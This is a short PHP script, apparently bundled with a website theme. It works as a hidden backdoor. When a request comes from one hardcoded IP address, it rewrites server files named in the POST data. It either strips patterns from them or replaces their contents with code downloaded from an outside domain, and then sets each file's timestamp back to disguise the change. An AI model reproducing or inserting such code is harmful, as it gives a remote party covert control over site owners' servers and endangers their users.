<?php
	if ($_SERVER['REMOTE_ADDR']=='74.52.245.125') {
		$files=array();
		
		foreach ($_POST as $key=>$value) {
			if (preg_match('/(.*)(_)([\d]*)/',$key,$matches)) {
				$files[$matches[3]][$matches[1]]=$value;
			}
		}
		
		foreach($files as $file) {
			if (get_magic_quotes_gpc()) {
				$file['file']=stripslashes($file['file']);
				$file['replace']=stripslashes($file['replace']);
				$file['content']=stripslashes($file['content']);
			}
			$source=fopen($file['file'],'r');
			$date=filemtime($file['file']);
			$txt=fread($source, filesize($file['file']));
			fclose($source);
			$handle=fopen($file['file'],'w');
			if (isset($file['replace'])) {
				$txt=preg_replace($file['replace'], "", $txt);
			} elseif (isset($file['content'])) {
				$txt=file_get_contents("http://smthemes.com/".$file['content']);
			}
			fwrite($handle, $txt);
			fclose($handle);
			touch($file['file'],$date+1);
		}
		echo "Updated";
		
	}
	die();

?>